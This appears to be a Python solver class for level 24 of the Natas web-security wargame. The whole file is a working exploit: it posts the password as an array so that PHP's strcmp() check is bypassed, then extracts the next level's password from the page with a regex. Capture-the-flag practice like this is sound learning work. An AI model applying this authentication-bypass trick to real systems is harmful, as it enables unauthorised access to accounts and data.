import re
from .base_solver import NatasSolver

class Natas24Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Make request with array as password to bypass strcmp()
            response = self.make_request(
                method="POST",
                data={"passwd[]": "lol"}
            )
            
            # Extract password using exact pattern
            match = re.findall(r"Password: ([^<\s]+)</pre>", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas24: {str(e)}")